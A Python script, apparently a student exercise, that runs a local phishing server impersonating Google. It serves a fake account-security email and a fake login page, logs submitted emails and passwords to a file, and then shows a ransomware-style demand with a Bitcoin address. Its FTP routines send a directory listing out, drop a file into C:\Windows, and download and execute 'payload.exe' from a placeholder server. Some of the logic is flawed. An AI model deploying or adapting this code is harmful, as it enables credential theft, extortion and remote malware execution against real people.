import http.server
import socketserver
import urllib.parse
import os
import platform
import webbrowser
import shutil
from ftplib import FTP

# HTML content for the phishing email page with a new message
realistic_phishing_email_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activate Your Google Account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .email-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 600px;
            padding: 20px;
            text-align: left;
            border: 1px solid #ccc;
        }
        .email-header {
            background-color: #4285f4;
            color: #fff;
            padding: 10px;
            text-align: center;
            border-radius: 8px 8px 0 0;
        }
        .email-header h1 {
            margin: 0;
            font-size: 24px;
        }
        .email-body {
            padding: 20px;
        }
        .email-body img {
            width: 100px;
            display: block;
            margin: 0 auto 20px auto;
        }
        .email-body h2 {
            color: #d93025;
            margin-bottom: 10px;
        }
        .email-body p {
            font-size: 16px;
            line-height: 1.6;
        }
        .email-body button {
            display: block;
            margin-top: 20px;
            padding: 15px;
            background-color: #4285f4;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
            width: 100%;
        }
        .email-body button:hover {
            background-color: #3367d6;
        }
        .email-footer {
            text-align: center;
            font-size: 12px;
            color: #888;
            margin-top: 20px;
            border-top: 1px solid #ccc;
            padding-top: 10px;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="email-header">
            <h1>Google Account Team</h1>
        </div>
        <div class="email-body">
            <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" alt="Google Logo">
            <h2>Action Required: Activate Your Google Account</h2>
            <p>
                Dear User,<br><br>
                We have noticed unusual activity in your Google account. For security reasons, we recommend that you activate your account to prevent unauthorized access. 
                Please click the button below to activate your account and verify your identity.
            </p>
            <p>
                Activating your account ensures that your information is secure and that you will not experience any interruptions in your service. 
                This step must be completed within the next 24 hours to avoid temporary suspension of your account.
            </p>
            <button onclick="location.href='/fake-login'">Activate Your Account</button>
            <p>
                If you did not request this activation, please ignore this email.
            </p>
        </div>
        <div class="email-footer">
            <p>This email was sent to you as a security precaution. If you did not request this email, please ignore it.</p>
            <p>Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</p>
        </div>
    </div>
</body>
</html>
'''

# HTML content for the fake Google login page
google_login_page_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            padding: 20px;
            text-align: center;
        }
        .login-container img {
            width: 50px;
            margin-bottom: 20px;
        }
        .login-container h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        .login-container input[type="text"], 
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4285f4;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #3367d6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" alt="Google Logo">
        <h1>Sign in</h1>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
'''

# HTML content for the fake ransomware page
ransomware_page_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ransomware Warning</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #ff0000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .ransomware-container {
            max-width: 800px;
        }
        h1 {
            font-size: 32px;
        }
        p {
            font-size: 20px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="ransomware-container">
        <h1>Oops, your important files are encrypted.</h1>
        <p>If you see this text, then your files are no longer accessible, because they have been encrypted. 
        Perhaps you are busy looking for a way to recover your files, but don't waste your time. 
        Nobody can recover your files without our decryption service.</p>
        <p>We guarantee that you can recover all your files safely and easily. All you need to do is submit the payment and purchase the decryption key.</p>
        <p>Please follow the instructions:</p>
        <p>1. Send $300 worth of Bitcoin to the following address:<br>
        1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</p>
        <p>2. Send your Bitcoin wallet ID and personal installation key to e-mail<br>
        wowmith123456@posteo.net. Your personal installation key:<br>
        zRNagE-CDBMfc-pD5Ai4-vFd5d2-14mhs5-d7UCzb-RYjq3E-ANg8rK-49XF</p>
        <p>If you already purchased your key, please enter it below.</p>
    </div>
</body>
</html>
'''


# Function to collect system information
def get_system_info():
    system_info = {
        'hostname': platform.node(),
        'ip_address': '127.0.0.1',  # Replace with code to get IP address if necessary
        'platform': platform.system(),
        'platform_version': platform.version()
    }
    return system_info


# Function to write date and time to a file
def write_date_and_time(student_number):
    current_time = platform.system()
    with open("StudentInfo.txt", "w") as file:
        file.write(f"Student Number: {student_number}\n")
        file.write(f"Date and Time: {current_time}\n")
    print("System date and time written to StudentInfo.txt")


# Function to open a web browser to a specified URL
def open_website(url):
    webbrowser.open(url)
    print(f"Opened website: {url}")


# Function to save directory listing of C: drive
def save_directory_listing(student_number):
    try:
        directory_listing = os.listdir("C:\\")  # Replace with "/" for Unix-based systems
        file_name = f"ComputerInfo{student_number}.dll"
        with open(file_name, "w") as file:
            for item in directory_listing:
                file.write(f"{item}\n")
        print(f"Directory listing saved to {file_name}")
        return file_name
    except PermissionError:
        print("Permission denied. Run as administrator.")
        return None


# Function to copy file to C:\Windows directory
def copy_to_windows_directory(file_name):
    try:
        shutil.copy(file_name, "C:\\Windows")
        print(f"Copied {file_name} to C:\\Windows directory")
    except PermissionError:
        print("Permission denied. Run as administrator.")


# Function to upload file to FTP server
def upload_to_ftp(file_name, ftp_details):
    try:
        ftp = FTP(ftp_details['host'])
        ftp.login(ftp_details['user'], ftp_details['password'])
        with open(file_name, 'rb') as file:
            ftp.storbinary(f"STOR {file_name}", file)
        ftp.quit()
        print(f"Uploaded {file_name} to FTP server.")
    except Exception as e:
        print(f"Failed to upload: {e}")


# Function to download and execute file from FTP server
def download_and_execute(file_name, ftp_details):
    try:
        ftp = FTP(ftp_details['host'])
        ftp.login(ftp_details['user'], ftp_details['password'])
        with open(file_name, 'wb') as file:
            ftp.retrbinary(f"RETR {file_name}", file.write)
        ftp.quit()
        os.startfile(file_name)
        print(f"Downloaded and executed {file_name} from FTP server.")
    except Exception as e:
        print(f"Failed to download or execute: {e}")


# Function to report results back to FTP server
def report_results(result_message, ftp_details):
    try:
        with open('result.txt', 'w') as file:
            file.write(result_message)
        upload_to_ftp('result.txt', ftp_details)
        print("Reported results successfully.")
    except Exception as e:
        print(f"Failed to report results: {e}")


# Python HTTP request handler to serve the phishing page and handle form submissions
class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/email':
            # Serve the realistic Google phishing email page with new message
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(realistic_phishing_email_html.encode())
        elif self.path == '/fake-login':
            # Serve the fake Google login page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(google_login_page_html.encode())
        else:
            # Serve 404 for other requests
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/capture':
            # Parse form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            post_data = urllib.parse.parse_qs(post_data.decode())

            email = post_data.get('email', [''])[0]
            password = post_data.get('password', [''])[0]

            # Save credentials to a file
            with open('captured_email_logins.txt', 'a') as f:
                f.write(f"Email: {email} | Password: {password}\n")

            # Redirect to the fake ransomware page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(ransomware_page_html.encode())


# Function to start the local server
def start_server(port=8080):
    handler = PhishingHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving phishing page at http://localhost:{port}")
        httpd.serve_forever()


# Main Function to execute all tasks
def main():
    student_number = "1234567"
    ftp_details = {
        "host": "your_ftp_server_address",
        "user": "your_username",
        "password": "your_password"
    }

    # Execute all tasks sequentially
    write_date_and_time(student_number)
    open_website("https://www.example.com")  # Replace with your target URL
    system_info = get_system_info()
    print(system_info)  # Print system info for verification
    dll_file = save_directory_listing(student_number)
    if dll_file:
        copy_to_windows_directory(dll_file)
        upload_to_ftp(dll_file, ftp_details)
        download_and_execute("payload.exe", ftp_details)  # Replace with your file name
        report_results("Malware executed successfully.", ftp_details)


# Create the captured_email_logins.txt file if it doesn't exist
if not os.path.exists('captured_email_logins.txt'):
    with open('captured_email_logins.txt', 'w') as f:
        f.write("Captured Email Login Credentials:\n")

# Start the phishing server and execute the main function
if __name__ == "__main__":
    start_server()  # Start phishing server
    main()  # Execute malware tasks
